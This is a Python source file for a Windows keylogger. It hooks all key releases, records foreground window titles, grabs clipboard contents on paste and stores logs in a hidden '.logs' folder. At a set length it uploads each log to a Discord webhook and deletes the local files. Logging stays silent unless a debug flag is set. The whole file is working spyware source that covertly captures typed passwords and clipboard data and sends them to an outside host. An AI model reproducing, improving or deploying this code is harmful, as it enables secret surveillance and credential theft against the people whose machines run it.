import keyboard
#from pyautogui import screenshot

from datetime import datetime
from win32gui import GetWindowText, GetForegroundWindow
import sys
import win32clipboard
import requests
import logging
#import gzip
#import shutil
import os
#import tarfile
import argparse

# parser
parser = argparse.ArgumentParser()
parser.add_argument("-u", '--url', metavar="", help="insert your Discord's Webhook url here")
parser.add_argument("-l", '--length', type=int, metavar="", help="maximum total characters before Keylogger sends the log")
parser.add_argument("-d", '--debug', action="store_true", help="if specified, this will print logs") # optional; default false
args = parser.parse_args()
    
class KeyLogger:
    def __init__(self, webhook_url, max_length, logs_dir):
        os.chdir(logs_dir)
        try:
            os.mkdir(".logs")
        except FileExistsError:
            pass
        
        self.url = webhook_url
        self.logs_dir = os.path.join(logs_dir, ".logs") # Default value for `logs_dir` is C:\\Users\\<USER>\\.logs\\
        self.max_length = max_length # total characters
        self.previous_key = ""
        self.previous_window = ""
        self.current_window = ""
        self.log = ""
  

    def get_current_time(self, as_date=False):
        now = datetime.now()
        if as_date:
            return now.strftime("%H:%M:%S %d/%m/%Y")

        return now.strftime("%H%M%S_%d-%m-%Y")


    # def compress_files(self):
    #     """
    #     Compress all file in the specified directory `logs_dir`
    #     """
    #     # combine all files into one tar file
    #     tar_file = self.get_current_time() + ".tar"
    #     with tarfile.open(tar_file, "w") as tar:
    #         for path in os.scandir(self.logs_dir): # locate all files in the log directory
    #             tar.add(path.name)

    #     # compress the tar file with gzip
    #     gzip_file = tar_file + ".gz"
    #     with open(tar_file, 'rb') as f_in:
    #         with gzip.open(gzip_file, 'wb') as f_out:
    #             shutil.copyfileobj(f_in, f_out)

    #     logging.info("Compression completed!")
    #     return gzip_file

    
    def send_log(self, filename=None):  
        """
        Send the log file with Discord's Webhook
        """
        if filename == None:
            filename = self.compress_files()

        with open(filename, 'rb') as file:
            result = requests.post(self.url, files={filename: file.read()})
            logging.info("[+] Logs is sent!")
        
        # if log is successfuly sent, remove all files in the directory
        for path in os.scandir(self.logs_dir):
            os.remove(path.name)
            logging.info(f"[+] {path.name} is removed!")

    
    def get_current_window(self):
        """
        Get the name of currently use window.
        """
        return GetWindowText(GetForegroundWindow())


    def get_clipboard_data(self):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard() # enables other windows to access the clipboard
        return data


    # def save_screenshot(self):
    #     """
    #     Do a screenshot of the entire screen and save it in the log directory
    #     """
    #     filename = os.path.join(self.logs_dir, self.get_current_time()+'.png')
    #     screenshot().save(filename)
    #     logging.info(f"{filename} is saved!")
    

    def save_log_file(self):
        """
        Save the log file in the system then send it to Discord.
        After finished, delete the file.
        """
        filename = self.get_current_time() + ".log"
        with open(filename, "w") as file:
            file.write(self.log)

        self.send_log(filename)


    def report_log(self, key, window):
        self.log += key
        self.previous_key = key
        self.previous_window = window


    def callback(self, event):
        key = event.name
        window = self.get_current_window()

        # after a certain length, save the log to a file and send it to discord
        if len(self.log) > self.max_length:
            self.save_log_file()
            self.log = "" # empty the variable after log delivery

        # check to see if target changed windows.
        # the window change can happen at any time but 
        # we're only interested in the window the user currently use.
        if (window != self.previous_window):
            message = f"\n[{self.get_current_time(as_date=True)}] -> {window}\n"
            logging.info(message)
            self.log += message
            #self.save_screenshot()

        # keys formatting
        if (key == "space"):
            key = " "
        elif (key == "enter"):
            key = "<ENTER>"
        # if [Ctrl-V], get the value on the clipboards
        elif (self.previous_key == "<CTRL>") and (key.lower() == 'v'):
            key = f"\n[CLIPBOARD] -> {self.get_clipboard_data()}\n"
        # if they pressed a non standard key
        elif len(key) > 1:
            key = f"<{key.upper()}>"
        
        # dirty ways to circumvent debug without using logging
        if (args.debug):
            sys.stdout.write(key)
            sys.stdout.flush()

        self.report_log(key, window)


    def run(self):
        logging.info("[*] Running keylogger...")
        logging.info("[*] Saving log every 500 characters!")
        # we use on_release instead of on_press because the latter would 
        # continously print the result as long as the key is pressed
        keyboard.on_release(callback=self.callback) 
        
        # Block forever, like `while True`
        keyboard.wait()


def main():
    # logging
    logging.basicConfig(format="%(message)s", level=logging.INFO)
    # disable logging if debug flag is not enabled
    if (not args.debug):
        logging.disable(logging.INFO)
    
    # initialize keylogger object
    WEBHOOK_URL = args.url
    MAX_LENGTH = args.length
    logs_dir = os.path.expanduser("~")
    keylogger = KeyLogger(WEBHOOK_URL, MAX_LENGTH, logs_dir)
    keylogger.run()


if __name__ == "__main__":
    main()